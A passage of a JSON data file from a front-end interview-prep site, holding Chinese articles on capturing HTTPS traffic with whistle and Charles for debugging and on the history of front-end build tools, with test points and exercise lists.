生成 **pre-master-secure**，通过服务端**公钥加密**发送给 server\n        \n    -   server 收到 **pre-master-secure**，根据约定的算法使用**S\\_私钥**对 **pre-master-secure** 解密\n        \n    -   这个时候，客户端和服务端都拥有 random1、random2、pre-master 以及约定的对称密钥生成方法，可以生成相同的**master-secure**（对称加密的密钥）进行加解密了。\n        \n-   最后，就可以使用 **master-secure** 进行真正的数据对称加密传输。\n    \n\n**中间人想要抓包，需在 HTTPS 加密通信之前：**\n\n1.  截取客户端发送的包含证书的报文，伪装成服务端，把自己的证书发给客户端，然后拿到【客户端返回的包含对称加密通信密钥的报文】，生成中间人与客户端对称加密的密钥。\n    \n2.  同样伪装成客户端，以服务端自己的非对称公钥加密【客户端返回的包含对称加密通信密钥的报文】发给服务端，获得服务端生成的对称加密密钥。\n    \n3.  这样一来，加密通信建立完成，而中间人拿到了通信的数据密钥，可以查看、修改 HTTPS 的通信报文。\n    \n4.  这里客户端与中间人通信、中间人与服务端通信，都是正常建立了 HTTPS 加密连接的。\n    \n\n![image.png](https://static.ecool.fun//article/aa0688ef-9744-4c27-88f6-3c47ef467f8a.awebp)\n\n其中很重要的一步是**浏览器的根证书校验**，CA 机构不可能随便给一个中间人签发不属于它的域名证书，也就不在客户端的操作系统上了，因此**只能把中间人的根证书，导入到客户端的操作系统**了，以此完成建立加密通信时对中间人证书的验证。\n\n### 2.3 电脑如何抓手机的包\n\n要想通过电脑端获取手机 Web 应用的数据包，根据前面所学，就需要中间人策略。\n\nPC 端建立一个服务器中间人进程，伪装为 web 应用的目标服务器。手机端 web 应用发送的请求数据先经过中间人，中间人进行拦截处理再发送给目标服务器。反过来，目标服务器发送的数据包先通过中间人，再由中间人响应给浏览器客户端。\n\n这里要注意的是，无论是个人电脑PC，还是移动端手机，都需要接入互联网网络，可以相互找到对方才能建立通信。\n\n一般对开发来说，个人电脑本地起的服务器进程，在公网上是访问不到的。一般是无线局域网，个人电脑与手机端连接同一个路由器发出的 Wi-Fi，就可以相互通信。\n\n![image.png](https://static.ecool.fun//article/0d272ac6-0397-4675-814c-3c6eeee3469d.awebp)\n\n具体步骤：\n\n1.  在 PC 电脑本地起一个服务器进程，监听一个端口比如 8899\n    \n2.  在手机上连接同一个局域网，配置网络代理，指向 PC 端的 IP 地址和 8899 端口\n    \n3.  这样一来，手机上所有的网络通信都会被先转发到 PC 端的 8899 端口，就可以对数据包进行分析处理\n    \n\n拿访问 youtuBe 来说，比如电脑已经使用【服务器软件】成功访问，此时只要手机配置代理指向电脑 ip 地址和指定端口，手机就可以同样访问 youtuBe了。\n\n## 3\\. 抓包工具 whistle\n\n### 3.1 whistle 是什么\n\nWhistle 是基于 Node 实现的跨平台抓包免费调试工具，其主要特点：\n\n1.  完全跨平台：支持 Mac、Windows 等桌面系统，且支持服务端等命令行系统\n    \n2.  功能强大：\n    \n\n-   支持作为 HTTP、HTTPS、SOCKS 代理及反向代理\n    \n-   支持抓包及修改 HTTP、HTTPS、HTTP2、WebSocket、TCP 请求\n    \n-   支持重放及构造 HTTP、HTTPS、HTTP2、WebSocket、TCP 请求\n    \n-   支持设置上游代理、PAC 脚本、Hosts、延迟（限速）请求响应等\n    \n-   支持查看远程页面的 console 日志及 DOM 节点\n    \n-   支持用 Node 开发插件扩展功能，也可以作为独立 npm 包引用\n    \n\n3.  操作简单\n\n-   直接通过浏览器查看抓包、修改请求\n    \n-   所有修改操作都可以通过配置方式实现（类似系统 Hosts），并支持分组管理\n    \n-   项目可以自带代理规则并一键配置到本地 Whistle 代理，也可以通过定制插件简化操作\n    \n\n**如何快速使用 whistle**\n\n1.  先安装 node，建议用 nvm 管理\n    \n2.  全局安装 whistle\n    \n\n```sh\n\nnpm i -g whistle & w2 start\n\n```\n\n安装后，可以在电脑上设置全局代理，代理的端口为 8899.\n\n```sh\n\nw2 proxy // 设置全局代理\n\nw2 proxy off // 关闭全局代理\n\n```\n\n就可以通过浏览器访问 `http://127.0.0.1:8899/` 查看抓包、修改请求等。\n\n![image.png](https://static.ecool.fun//article/2465f282-7b78-4ad5-a95d-6921e3fce323.awebp)\n\n如果你不想使用全局代理，就可以安装 `SwitchyOmega` 插件，按需对某些网站设置 whistle 代理。\n\n1.  选择 Whistle 代理\n\n![image.png](https://static.ecool.fun//article/8945eaba-40fe-4347-8012-58712e89b1f1.awebp)\n\n如果你想抓取本地服务器启动的网站应用，比如127.0.0.1 或 localhost 这样的网页，清空不代理的地址列表\n\n```css\n\n127.0.0.1\n\n[::1]\n\nlocalhost\n\n```\n\n并添加 `<-loopback>`，即可正常抓包\n\n![口情量模式：proxy.png](https://static.ecool.fun//article/e0a539eb-7d36-4566-9655-9f7b0935b535.awebp)\n\n2.  设置 Whistle 代理\n\n![image.png](https://static.ecool.fun//article/5da3bb8b-3c3b-4617-ba1b-3e72ef471f4d.awebp)\n\n### 3.2 whistle 可以做的事情\n\nwhistle 可以做的事情很多，以下是官网图：\n\n![image.png](https://static.ecool.fun//article/2b900e3d-01c0-424e-96a6-fefab5fea7ab.awebp)\n\n一些例子配置如下图所示：\n\n![image.png](https://static.ecool.fun//article/c72f7d6c-8a24-4e65-b501-f683f66fce2d.awebp)\n\n## 4\\. whistle 实战案例\n\n### 4.1 原生 app 加载 PC本地代码开发\n\n在原生 app 上已经通过 h5 域名加载了 web 页面，但是本地开发时不想每次都走流水线或本地打包上传代码。\n\n需要把原生 app 的请求代理到本地服务器上来，前提条件是 wifi 手机与电脑可相互访问，也就是前面提到的电脑抓 pc 的包。\n\n因为我的 web 服务端是 https 应用，因此需要下载 whistle 提供的根证书，手动导入到手机上。\n\n点击 HTTPS 菜单，然后使用手机扫描二维码，使用手机浏览器打开即可下载，在手机证书中设置进行导入并且设置信任。\n\n![image.png](https://static.ecool.fun//article/dd13699b-d441-4421-b9e3-8959bb2abe1e.awebp)\n\n此时，再在手机上配置代理指向 PC 电脑的 IP和 whistle 监听的端口即可在电脑上截获数据包。\n\n我本地webpack 启动的服务器应用访问地址为：[xxx.xxx.xxx.xxx:8080](http://xxx.xxx.xxx.xxx:8080 \"http://xxx.xxx.xxx.xxx:8080\")\n\nwhistle 的配置规则：\n\n```sh\n\n# Rules\n\n# 访问首页走本地\n\njecyu.com/webs/short-transport http://xxx.xxx.xxx.xxx:8080?deptCode=755DL # 首页路径\n\n# 后续的请求都使用本地代码\n\njecyu.com http://xxx.xxx.xxx.xxx:8080?deptCode=755DL\n\n```\n\n其中试过在原生 app 访问本地应用时出现错误“ webpack 会提示 invalid host header”，解决方案是在 devServer 配置添加即可：\n\n```js\n\ndevServer: {\n\n    allowedHosts: 'all',\n\n}\n\n```\n\n至此，成功让原生 app 访问PC 端本地的开发代码。\n\n### 4.2 查看移动端的 DOM 样式\n\nWhistle 能够通过内置的 Weinre 去实现查看移动端的 `DOM` 样式，配置规则如下\n\n```perl\n\n# 设置 weinre\n\nhttps://juejin.cn weinre://test\nhttp://192.168.0.196:3000/ weinre://test2 # 本地服务器的也可以\n```\n\n开启设置后，选择下拉框打开监听窗口等待连接\n\n![image.png](https://static.ecool.fun//article/b676a802-9487-4564-a577-170f88d3e990.awebp)\n\n手机上再重新访问 [juejin.cn](https://juejin.cn \"https://juejin.cn\") 网站，然后打开 weinre 可以看到如下，绿色表示远程连接成功。\n\n![image.png](https://static.ecool.fun//article/dbffc4ce-aaba-4528-8c16-ba9a188e47fd.awebp)\n\n可以点击 Element 查看手机上网页 DOM 结构、样式等信息。\n\n![image.png](https://static.ecool.fun//article/c8a7007f-0f74-40af-be8d-9265cd62ff5d.awebp)\n\n也可以在 console 控制台中，执行代码，比如 alert，手机应用上会显示弹框，在调试原生方法时很方便的。\n\n![image.png](https://static.ecool.fun//article/feae2f84-cdf2-4f17-83b3-79e71a106b74.awebp)\n\n### 4.3 解决本地开发跨域问题\n\n跨域问题的产生本质上是 浏览器实现\\*\\*同源策略（Same Origin Policy）\\*\\*的一种安全手段。对于同源的定义，url 协议（protocol）、端口（port）、主机（host 域名）完全相同称为同源站点。\n\n同源策略限制了两个不同源站点的资源访问，比如前端想通过 XMLHttpRequest 将站点数据发送给不同源站点，就会产生跨域问题。\n\n比如本地开发环境是 `http://localhost:10086`，请求的服务器地址是：`https://jecyu.sit.com`，这个时候 chrome 浏览器会报跨域错误。\n\n解决跨域问题，有很多种方式，比如使用 JSONP、CORS、Proxy 等方案。其中 CORS 跨域资源共享是为了解决同源策略的网络层面限制而引入的，它是一种基于 HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其他 origin（域，协议和端口），这样会浏览器可以访问加载这些资源。\n\n在 whistle 中可以这样配置：\n\n![image.png](https://static.ecool.fun//article/43615be8-f140-4e3a-993d-8653e494c26e.awebp)\n\n## Charles\n\n`Charles` 是在 `PC` 端常用的网络请求截取工具，无论前端还是后端开发者，都是应该必备的工作提效利器！\n\n## 电脑端抓包配置\n\n本文Mac电脑为例\n\n### 首先官网下载 charles\n\ncharles 官方下载地址 [www.charlesproxy.com/download/](https://link.juejin.cn?target=http%3A%2F%2Fwww.charlesproxy.com%2Fdownload%2F \"http://www.charlesproxy.com/download/\")\n[charles 官方下载地址](https://link.juejin.cn?target=http%3A%2F%2Fwww.charlesproxy.com%2Fdownload%2F \"http://www.charlesproxy.com/download/\")\n\n### 下载安装证书\n\n##### 下载安装CA证书\n\n安装 `CA` 证书的目的是为了抓包 `https` 请求，完成 `SSL` 证书校验(这部分会在原理篇单独讲解)\n\n操作步骤：点击顶部工具栏的 `Help`---> `SSL Proying` ---> `Install Charles Root Certificate`\n\n![image.png](https://static.ecool.fun//article/340b8eba-62c5-48fe-9dd6-ae5968bbcc14.awebp)\n\n##### 安装证书并设置为始终信任\n\n上面的证书安装成功最后一步，会确定是否添加证书到钥匙串，选择添加到本地项目\n![image.png](https://static.ecool.fun//article/215dbc9f-05d4-4689-8fa3-c24e3e2919fd.awebp)\n\n证书添加成功会弹出钥匙串访问页面，然后找到 `Charles Proxy` 证书\n![image.png](https://static.ecool.fun//article/42c21c83-32a9-4fa1-81e0-f55a610b3ee2.awebp)\n\n双击证书会进入详情页面，提示此证书不被信任，点击信任按钮，修改为**始终信任**\n\n![image.png](https://static.ecool.fun//article/fb72fdad-aaac-4fe3-b48c-2786ffb24e74.awebp)\n\n## Charles 代理服务器设置\n\n### 配置 Http 代理\n\n设置代理，操作步骤：在顶部工具栏选择 `Proxy` ---> `Proxy setting`\n\n![image.png](https://static.ecool.fun//article/cee7ee3e-e4c4-435b-916b-ec51031883b6.awebp)\n\n选择 `Proxies` 开始配置，`port` 默认端口为 `8888`，若端口被占用需手动自行修改\n\n`Enable transparent HTTP proxying` (透明 `HTTP` 代理)\n\n透明代理使 `Charles` 能够去支持那些不支持 `HTTP` 代理服务器的客户端，或者说不知道正在使用 `HTTP` 代理服务器，例如 `TCP/IP` 连接由路由器或防火墙重定向到 `Charles`\n\n![7.png](https://static.ecool.fun//article/9413a5f0-bfb7-4420-ab94-152c09feb8df.awebp)\n\n### 配置 Https 代理\n\n目前大多数的网络请求接口都是 `https`，`Charles`也需要配置 `SSL` 代理进行抓包\n操作步骤：顶部工具栏---> `Proxy` ---> `SSL Proxying Settings`\n\n![8.png](https://static.ecool.fun//article/5fa001e8-fb58-4ece-a328-181a08718dde.awebp)\n\n选择后出现如下页面，`IP` 设置为通配符\\*，代表任意服务器IP，端口设为443，当然端口也可以设置为\\*;https的默认端口为 `443` ，一般来说企业不会去修改它。当然端口配置为`*`更严谨一些\n\n![image.png](https://static.ecool.fun//article/48e3402f-f48c-41cf-ab55-6add24a4fcf4.awebp)\n\n## 移动端抓包配置\n\n本文Android手机为例\n\n### 移动端配置\n\n首先需要修改手机网络，调整手机 `wifi` 和电脑在同一局域网中，\n\n操作步骤：长按使用的 `wifi` --> 修改网络-->选择高级选项-->手动代理-->代理服务器主机名设置为电脑 `ip` 地址，代理端口设置为 `8888` --> 完成后点击保存。\n\n### 移动端证书下载\n\n，\n操作步骤：点击电脑安装的`Charles`顶部工具栏--> 选择 `Help`--> `Install Charles Root Certificate on Mobile Device or Remote Browser`\n\n![10.png](https://static.ecool.fun//article/d8db37f3-f69e-4e1b-b5e2-2ec9ce24944f.awebp)\n\n`Charles` 页面会弹出是否接受移动端连接？并安装证书\n\n![11.png](https://static.ecool.fun//article/68da0dbd-1f6e-41bc-a6e9-d9869c216c6f.awebp)\n\n确认配置你的设备使用 `Charles`\n\n![12.png](https://static.ecool.fun//article/a0b64c1e-4d0a-4229-b9e3-1a31aaae9236.awebp)\n\n![13.png](https://static.ecool.fun//article/2c11546c-a826-427c-8312-2e5d6ff49333.awebp)\n\n看到这部分内容后，到手机浏览器输入地址 `chls.pro/ssl` 下载证书，在浏览器中回车开始下载，等待下载完成。\n\n![](https://static.ecool.fun//article/d8a8d219-d07a-47d5-9ef9-a32112507e8d.awebp)\n\n### 使用证书\n\n证书下载完成后，需要在手机中设置使用证书。\n\n操作步骤：`Android` 手机-->密码隐私与安全-->系统安全-->加密与凭据--> 从存储设备安装-->找到设备刚刚下载的证书进行安装-->安装成功后可以去信任的凭据-->用户\n\n### 开始抓包\n\n以上信息完成后，我们就可以在移动端抓包了，抓到的接口数据会显示到 `Charles` 中。\n\n以抓取掘金接口为例子,在 `Android` 掘金`APP` 点击进入一篇文章。\n\n在 `Charles` 中会显示调用的所有接口\n\n![15.png](https://static.ecool.fun//article/740f39c6-f885-476f-8145-368c290ee9a4.awebp)\n\n> 其实根据这些数据可以做很多事情，也可以做一些数据分析，这里就不展开讲了。\n\n## Charles 基础视图介绍\n\n![16.png](https://static.ecool.fun//article/9348453c-a13b-45ad-95b2-ce30c965593c.awebp)\n\n## Charles 抓包常用技巧\n\n### Repeat\n\n通过 `Charles` 重复发送请求，可以自定义重复发送请求的并发数量或时间间隔，不可修改请求内容。\n\n右键请求接口，会看到 `Repeat` 和 `Repeat Advanced`\n\n![17.png](https://static.ecool.fun//article/b3df23f1-365d-4f2d-9144-5b611b5e3e6b.awebp)\n\n![18.png](https://static.ecool.fun//article/2fa5d06a-308c-42fe-9733-0e7eac8c1653.awebp)\n\n自定义设置完成点击`ok`，`Charles` 中会重新打开一个 `session` 会话按照自定义设置发送请求。\n\n### Rewrite\n\n重写请求，主要对某些匹配请求的 `header、host、url、path、query param、response status、body` 进行 `rewrite`。\n\n选中 `Enable Rewrite` --->输入需要重写的接名称--->点击 `add` 按钮会在侧边栏显示(重写获取文章接口)--->编写添加要映射的接口--->点击 `ok`\n\n![19.png](https://static.ecool.fun//article/72b37838-b07f-4e9b-83fd-6c9907d66397.awebp)\n\n点击右上方 `add`按钮会弹出下面对页面，编辑要重写的接口地址相关。\n\n![20.png](https://static.ecool.fun//article/bd9de0ac-3755-4a55-9833-7682ead95a1b.awebp)\n\n接下来点击右下方的 `add` 按钮,填写需要重写的具体内容\n\n![21.png](https://static.ecool.fun//article/f5090ef8-8c2a-4ab1-b48f-92cd85c60cf8.awebp)\n\n这里使用获取文章接口为例子，重写了响应数据中的 `err_msg` 字段，修改为`哈哈`。\n\n![22.png](https://static.ecool.fun//article/55c6c6e4-d97e-4b67-87c2-a2174e206900.awebp)\n\n重写成功后返回的数据\n\n![23.png](https://static.ecool.fun//article/95436b41-221c-42a9-b82e-f60537a49bbc.awebp)\n\n### Map Local\n\n映射本地: 将接口的请求重定向到本地文件 比较常用的一个场景，移动端或者网页端开发者可能用到比较多，类似 `Mock` 数据\n\n操作步骤：点击顶部工具栏 `Tools`--->点击 `Map Local` 弹出如下页面\n\n![24.png](https://static.ecool.fun//article/25fcee0a-838d-4328-a0df-8df0e9212492.awebp)\n\n选中 `Enable Map Local` --->点击 `add` 按钮会弹出 `Edit Mapping` 窗口--->编写添加要映射的接口--->点击 `ok`\n\n![25.png](https://static.ecool.fun//article/a6f2f52f-99a3-4647-bba8-75874a78bedd.awebp)\n\n### Map Remote\n\n映射远程: 对于后端开发者可用接口调试错误，直接映射到本地代码开发的 `127.0.0.1` ,这样可以直接用移动端或者网页端调试真实场景\n\n![26.png](https://static.ecool.fun//article/33d322a9-8150-43b6-a3fd-16b7cee94052.awebp)\n\n![27.png](https://static.ecool.fun//article/3809a117-8317-4436-a1a9-8906c14d5f6e.awebp)\n\n### Throttle Setting\n\n模拟网络环境进行接口请求，点击工具栏--> `Proxy`--> `Throttle Setting`\n\n![28.png](https://static.ecool.fun//article/25300703-ac75-4ad0-9279-ac9db4ed1bbd.awebp)\n\n![29.png](https://static.ecool.fun//article/fddd639a-f8de-40a4-987c-8245adf93a2a.awebp)\n\n选择 `Enable Throtting` -->选择要模拟的网络环境-->点击`ok`\n\n再次调用接口时候就会按照设置的网络环境请求。",
    "testPoint": "1. Wireshark：全能，支持 TCP 流重组、SSL 解密（需私钥）。  \n2. Fiddler：HTTP/HTTPS 专用，可改包、Mock、限速。  \n3. Charles：跨平台 HTTP 代理，界面友好，Map Local/Remote。  \n4. tcpdump：命令行轻量，Linux 标配，`-w` 写文件，`-i` 指定网卡。  \n5. 浏览器 DevTools：Network/Performance，前端日常够用。  \n口诀：系统级抓包用 Wireshark/tcpdump，HTTP 调试看 Fiddler/Charles，前端调接口直接 DevTools。",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:43:31.000Z",
    "updateAt": "2025-08-04T02:08:17.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "261": {
    "id": 261,
    "tagId": 28,
    "title": "前端构建工具详解",
    "explanation": "谈到构建工具，大家首先想到的肯定就是 `Webpack` 以及现在最🔥的 `Vite`。\n`Webpack`，功能强大，生态丰富，从面世到今天，一直是很受大家欢迎；`Vite` 采用 `unbundle` 构建模式，带来了极致的开发体验，给开发人员以新的选择。\n\n在这两个构建工具之外，还有其他的构建工具，如和 `Webpack`、`Vite` 类似的 `Rollup`、`Parcel`、`Esbuild`，自动化构建工具 `grunt`、`gulp`，以及更加久远的 `YUI Tool`。\n\n这些工具的存在，构成了前端构建工具的发展史。\n\n#### YUI Tool + Ant\n\n`YUI tool` 是 07 年左右出现的一个构建工具，功能比较简单，用于压缩混淆 `css` 和 `js` 代码，需要配合 `java` 的 `Ant` 使用。\n\n当时 web 应用开发主要采用 `JSP`，还不像现在这样前后端分离，通常是由 java 开发人员来编写 js、css 代码，前端代码都是和后端 java 代码放在一起的。因此前端代码的压缩混淆也就基于 java 实现了。\n\n#### Grunt / Gulp\n\n`Grunt` / `Gulp` 都是运行在 `node` 环境上的自动化工具。\n\n在开发过程中，我们可以将一些常见操作如`解析 html`、`es6 代码转换为 es5`、`less / sass 代码转换为 css 代码`、`代码检查`、`代码压缩`、`代码混淆`配置成一系列任务，然后通过 `Grunt` / `Gulp` 自动执行这些任务。\n\n`Grunt` 和 `Gulp` 的不同点：\n\n* 使用 `Grunt`的过程中，会产生一些中间态的临时文件。一些任务生成临时文件，其它任务可能会基于临时文件再做处理并生成最终的构建后文件，导致出现多次 `I/O`。\n* `Gulp` 有文件流的概念，通过管道将多个任务和操作连接起来，不会产生临时文件，减少了 `I/O` 操作，流程更清晰，更纯粹，大大加快了构建的速度。\n\n#### Webpack / Rollup / Parcel\n\n`Webpack`、`Rollup`、`Parcel` 统称为`静态模块打包器`。\n\n这一类构建工具，通常需要指定入口 - `entry`，然后以 `entry` 为起点，通过分析整个项目内各个源文件之间的依赖关系，构建一个模块依赖图 - `module graph`，然后再将 `module graph` 分离为三种类型的 `bundle`:\n`entry` 所在的 `initial bundle`、`lazy load` 需要的 `async bundle` 和自定义分离规则的 `custome bundle`。\n\n这几个构建工具各有优势:\n\n* `Webpack` 大而全，配置灵活，生态丰富，是构建工具的首选。\n* `Parcel` 号称零配置，使用简单，适合不太需要定制化构建的项目使用。\n* `Rollup` 推崇 `ESM` 标准开发，打包出来的代码干净，适用于组件库开发。\n\n#### Vite / Esbuild\n\n新一代构建工具。\n\n`esbuild`, 基于 `go` 语言实现，代码直接编译成机器码(不用像 js 那样先解析为字节码，再编译为机器码)，构建速度比 `webpack` 更快。\n\n`vite`, 开发模式下借助浏览器对 `ESM` 的支持，采用 `nobundle` 的方式进行构建，能提供极致的开发体验；生产模式下则基于 `rollup` 进行构建。\n\n### js 模块化的发展史和构建工具的变化\n\n`javascript` 语言设计之初，只是作为一个简单的脚本语言用来丰富网站的功能，并不像 `java`、`c++` 那样有 `module` 的概念，发展到现在的模样，也经历了相当长的时间。\n\n这段时间，可以简单归纳为：\n\n* `青铜时代` - no module；\n* `白银时代` - cjs、amd、cmd、umd、esm 相继出现；\n* `黄金时代` - 组件模块化；\n\n不同的时代，构建工具也不同。\n\n#### 青铜时代\n\n由于没有 `module` 的概念, `javascript` 无法在语言层面实现模块之间的`相互隔离`、`相互依赖`，只能由开发人员手动处理。\n\n相应的，早期的 `web` 开发也比较简单甚至简陋:\n\n* 通过`对象`、`iife(或者闭包)`的方式实现`模块隔离`；\n* 通过手动确定 `script` 的`加载顺序`确定模块之间的`依赖关系`。\n* `jsp` 开发模式，没有专门的前端，`html`、`js`、`css` 代码通常也由后端开发人员编写。\n\n为了`节省带宽`和`保密`，通常需要对前端代码做`压缩混淆`处理。这个时候，构建工具为 `YUI Tool` + `Ant`。\n\n#### 白银时代\n\n`chrome v8` 引擎 和 `node` 的横空出世，给前端带来了无限的可能。\n\n同时，`javascript` 的模块化标准也有了新的发展:\n\n1. `commonjs` 规范，适用于 `node` 环境开发。\n2. `amd`、`cmd` 规范，适用于`浏览器`环境。\n3. `umd`，兼容 `amd`、`commonjs`，代码可以同时运行在`浏览器`和 `node` 环境。\n4. `ESM`，即 `ES6 module`(这个时候还不是很成熟)；\n\n同时还出现了 `less`、`sass`、 `es6`、 `jslint`、 `eslint`、`typescript` 等新的东西， 前端角色也开始承担越来越重要的作用，慢慢的独立出来。\n\n有了 `node` 提供的平台，大量的工具开始涌现:\n\n* `requirejs` 提供的 `r.js` 插件，可以`分析 amd 模块依赖关系`、`合并压缩 js`、`优化 css`；\n* `less` / `sass` 插件，可以将 `less` / `sass` 代码转化为 `css` 代码；\n* `babel`，可以将 `es6` 转化为 `es5`；\n* `typescript`，将 `ts` 编译为 `js`；\n* `jslint` / `eslint`，代码检查；\n* ...\n\n这个时候，我们可以将上面的的这些操作配置成一个个任务，然后通过 `Grunt` / `Gulp` 自动执行任务。\n\n#### 黄金时代\n\n基于 `Angular`、`Vue`、`React` 三大框架和 `Webpack` 的使用，`组件模块化`成为前端开发的主流模式。同时 `ESM` 规范也原来越成熟，被更多的浏览器支持。\n\n以 `React` 和 `Webpack` 为例，通常我们会将一个应用涉及到的所有的功能拆分为一个个组件，如路由组件、页面组件、表单组件、表格组件等，一个组件对应一个源文件，然后通过 `Webpack` 将这些源文件打包。在开发过程中，还会通过 `Webpack` 开启一个 `local server`，实时查看代码的运行效果。\n\n`Webpack` 是一个静态模块打包器，它会以 `entry` 指定的入口文件为起点，分析整个项目内各个源文件之间的依赖关系，构建一个模块依赖图 - `module graph`，然后将 `module graph` 分离为多个 `bundle`。在构建 `module graph` 的过程中，会使用 `loader` 处理源文件，将它们转化为浏览器可以是识别的 `js`、`css`、`image`、`音视频`等。\n\n随着时间的发展， `Webpack` 的功能越来越来强大，也迎来诸多对手。\n\n```\nWebpack1\n   |\n   |\nRollup 出现(推崇 ESM 规范，可以实现 tree shaking, 打包出来的代码更干净)\n   |\n   |\nWebpack2(也实现了 tree shaking, 但是配置还是太繁琐了)\n   |\n   |\nParcel (号称 0 配置)\n   |\n   |\nWebpack4(通过 mode 确定 development 和 production 模式，各个模式有自己的默认配置)\n   |\n   |\nWebpack5(持久化缓存、module federation)\n\nEsbuild(采用 go 语言开发，比 Webpack 更快)\n\nVite(推崇 ESM 规范，开发模式采用 nobundle，更好的开发体验)\n\n```\n",
    "testPoint": "前端构建工具是现代前端工程化体系中的核心内容之一，涉及模块打包、依赖管理、性能优化、开发体验提升等多个方向。面试中考察点通常会覆盖原理、使用、性能优化、以及工具演进。\n\n\n## 一、基础认知类\n\n| 考点      | 说明                                           |\n| ------- | -------------------------------------------- |\n| 构建工具的作用 | 为什么需要构建工具？解决哪些问题（如模块化、压缩、兼容性、自动化）？           |\n| 常见构建工具  | webpack、Vite、Rollup、esbuild、Parcel 各自特点与适用场景 |\n| 构建流程概念  | 从源码到产物的完整流程（解析 → 转换 → 打包 → 优化）               |\n| 与脚手架区别  | 构建工具负责打包，脚手架（如 create-react-app、Umi）是上层封装    |\n\n---\n\n## 二、Webpack 方向（核心考点）\n\n| 考点                 | 说明                                                              |\n| ------------------ | --------------------------------------------------------------- |\n| 核心概念               | Entry、Output、Loader、Plugin、Module、Chunk、Bundle 区别               |\n| Loader             | 处理不同类型的文件，如 babel-loader、css-loader、file-loader                 |\n| Plugin             | 拓展构建流程的功能，如 HtmlWebpackPlugin、DefinePlugin、MiniCssExtractPlugin |\n| HMR（热更新）           | 原理、devServer 实现机制                                               |\n| Tree Shaking       | 原理（ES Module 静态分析）、副作用文件配置（sideEffects）                         |\n| Code Splitting     | 动态导入与分包策略                                                       |\n| 缓存优化               | hash、chunkhash、contenthash 区别与应用场景                              |\n| 性能优化               | 多进程构建（thread-loader）、持久化缓存（cache）、babel 编译优化                    |\n| webpack 与 Vite 的区别 | 构建速度、原理、依赖处理方式                                                  |\n\n---\n\n## 三、Vite 方向（现代化考点）\n\n| 考点         | 说明                               |\n| ---------- | -------------------------------- |\n| Vite 的核心原理 | 基于原生 ES 模块（ESM）的按需加载机制           |\n| 构建阶段区别     | 开发时使用 esbuild 启动快；生产时用 Rollup 打包 |\n| 热更新机制（HMR） | 基于 ESM 的模块热替换，无需重新构建全量 bundle    |\n| 插件系统       | Vite 插件与 Rollup 插件兼容性            |\n| 环境变量       | `.env` 文件加载、`import.meta.env` 使用 |\n| 常见优化方向     | 依赖预构建（Pre-Bundling）、SSR 支持、分包策略  |\n\n---\n\n## 四、Rollup 方向（库开发常考）\n\n| 考点           | 说明                                                   |\n| ------------ | ---------------------------------------------------- |\n| 核心特性         | 面向库的打包，支持 ES、CJS、UMD 等格式                             |\n| 与 Webpack 区别 | 专注于打包 JS 模块，输出简洁、无多余运行时代码                            |\n| Tree Shaking | 更加彻底的静态分析能力                                          |\n| 插件系统         | rollup-plugin-babel、rollup-plugin-node-resolve 等常用插件 |\n| 使用场景         | 通常用于 npm 库、UI 组件库的打包方案                               |\n\n---\n\n## 五、esbuild、swc（高性能方向）\n\n| 考点                  | 说明                                     |\n| ------------------- | -------------------------------------- |\n| 编译速度快的原因            | 基于 Go（esbuild）或 Rust（swc）编写，利用多线程与增量编译 |\n| 与 babel、webpack 的关系 | 可作为 babel-loader 替代品或底层构建加速器           |\n| 在 Vite、Next.js 中的应用 | 被广泛用作底层依赖预构建或转译工具                      |\n\n---\n\n## 六、构建性能优化方向（高级考点）\n\n| 优化点        | 说明                                                         |\n| ---------- | ---------------------------------------------------------- |\n| 构建体积优化     | Tree Shaking、Scope Hoisting、代码分割、压缩（Terser、ESBuild Minify） |\n| 构建速度优化     | 缓存（babel-loader cacheDirectory）、多进程、预编译依赖                  |\n| 资源优化       | 图片压缩、字体拆分、懒加载、按需加载                                         |\n| 开发体验优化     | HMR、SourceMap、错误提示优化                                       |\n| CI/CD 构建加速 | 缓存 node_modules、分布式构建、增量编译                                 |\n\n---\n\n## 七、工程化与生态集成考点\n\n| 考点             | 说明                                                  |\n| -------------- | --------------------------------------------------- |\n| 与框架结合          | React、Vue、Svelte 各自生态的构建特点（CRA、Vite、Nuxt）           |\n| 环境变量与配置分离      | 区分 dev、test、prod 配置的方案                              |\n| 自动化构建          | 使用 npm scripts、gulp、vite-plugin、webpack-cli 实现构建自动化 |\n| 前端监控           | sourcemap 上传（Sentry 集成）                             |\n| 多页面应用（MPA）构建方案 | entry 配置、HTML 动态生成、资源路径管理                           |\n\n",
    "exerciseKeyList": "[\"892f8cb0-4fab-4d43-8586-90b83e9da3aa\",\"cc4f1e33-57aa-487b-9bac-6b16ac8457aa\",\"45f3d2fd-ebbc-43d6-8dff-4e5ebcc79afc\",\"acf22a0a-87de-4627-a564-cdcd04a504bb\",\"72ab3559-3038-4a2c-985d-dd9004101ecf\",\"24799e30-6a38-46e5-b770-e575035b3a51\",\"d9ebcb10-02a4-448c-9a27-b5bcfacce4fa\",\"3bf0b33f-0adf-4943-a109-13302d58c13e\",\"f6b9383c-1ba2-47cc-a8db-5f9c4bbf77eb\",\"745130e9-61d4-4e51-8a8f-f1c8be354970\",\"499b7dea-d215-42a1-9c08-44fa8f65e1ee\",\"b4fc51b1-88d0-4213-80a0-49a5d9c6b9f4\",\"dc78e2f9-568a-445d-988c-594092179848\",\"0d0de429-d6eb-4eda-a614-0a3a22c05237\",\"9dc34a20-34be-4c0f-a401-71d936cf4958\",\"402c1f77-c556-4a1b-984f-07004305fba2\",\"c1ee1a9b-5955-4dc1-a89d-2ce7b017616a\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:25:34.000Z",
    "updateAt": "2025-10-23T08:22:14.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0d0de429-d6eb-4eda-a614-0a3a22c05237",
        "title": "说下Vite的原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-20T04:42:55.000Z",
        "updateAt": "2024-08-10T17:06:34.000Z"
      },
      {
        "exerciseKey": "24799e30-6a38-46e5-b770-e575035b3a51",
        "title": "webpack 中 module、chunk 、bundle 的区别是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:56:21.000Z"
      },
      {
        "exerciseKey": "3bf0b33f-0adf-4943-a109-13302d58c13e",
        "title": "webpack tree-shaking 在什么情况下会失效？",
        "category": "QA",
